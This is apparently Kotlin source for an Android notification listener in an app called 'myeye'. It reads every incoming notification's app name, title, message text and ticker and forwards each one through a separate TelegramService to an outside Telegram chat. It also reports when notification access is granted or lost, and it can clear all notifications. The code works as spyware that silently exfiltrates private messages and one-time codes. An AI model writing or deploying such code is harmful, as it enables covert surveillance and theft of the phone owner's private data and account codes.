package com.myeye

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.localbroadcastmanager.content.LocalBroadcastManager

class NotificationListener : NotificationListenerService() {
    
    companion object {
        const val TAG = "NotificationListener"
        const val ACTION_NOTIFICATION_POSTED = "com.myeye.NOTIFICATION_POSTED"
        const val EXTRA_NOTIFICATION_DATA = "notification_data"
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "NotificationListener Service Created")
        sendToTelegram("📱 Notification Listener Started")
    }
    
    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification Listener Connected")
        sendToTelegram("✅ Notification access granted")
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "Notification Listener Disconnected")
        sendToTelegram("❌ Notification access lost")
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        
        try {
            val packageName = sbn.packageName
            val notification = sbn.notification
            val title = notification.extras.getString("android.title") ?: "No Title"
            val text = notification.extras.getString("android.text") ?: "No Text"
            val tickerText = notification.tickerText?.toString() ?: ""
            
            val notificationData = """
                📱 New Notification Received
                ├── App: $packageName
                ├── Title: $title
                ├── Message: $text
                └── Ticker: $tickerText
                ⏰ Time: ${System.currentTimeMillis()}
            """.trimIndent()
            
            Log.d(TAG, "Notification: $notificationData")
            
            // Send to Telegram
            sendToTelegram(notificationData)
            
            // Broadcast locally if needed
            val intent = Intent(ACTION_NOTIFICATION_POSTED)
            intent.putExtra(EXTRA_NOTIFICATION_DATA, notificationData)
            LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)
        // Optional: Log notification removal
    }
    
    override fun onNotificationRankingUpdate(rankingMap: RankingMap) {
        super.onNotificationRankingUpdate(rankingMap)
        // Optional: Handle ranking updates
    }
    
    private fun sendToTelegram(message: String) {
        try {
            // Start TelegramService to send message
            val serviceIntent = Intent(this, TelegramService::class.java).apply {
                putExtra("message", message)
                putExtra("type", "notification")
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error sending to Telegram", e)
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "NotificationListener Service Destroyed")
        sendToTelegram("🔴 Notification Listener Stopped")
    }
    
    /**
     * Get all current notifications
     */
    fun getAllNotifications(): List<NotificationData> {
        val notifications = mutableListOf<NotificationData>()
        
        try {
            val activeNotifications = activeNotifications
            
            activeNotifications?.forEach { sbn ->
                val packageName = sbn.packageName
                val notification = sbn.notification
                val title = notification.extras.getString("android.title") ?: "No Title"
                val text = notification.extras.getString("android.text") ?: "No Text"
                
                notifications.add(
                    NotificationData(
                        packageName = packageName,
                        title = title,
                        message = text,
                        timestamp = System.currentTimeMillis()
                    )
                )
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error getting notifications", e)
        }
        
        return notifications
    }
    
    /**
     * Clear all notifications
     */
    fun clearAllNotifications() {
        try {
            cancelAllNotifications()
            Log.d(TAG, "All notifications cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing notifications", e)
        }
    }
    
    /**
     * Data class for notification info
     */
    data class NotificationData(
        val packageName: String,
        val title: String,
        val message: String,
        val timestamp: Long
    )
}
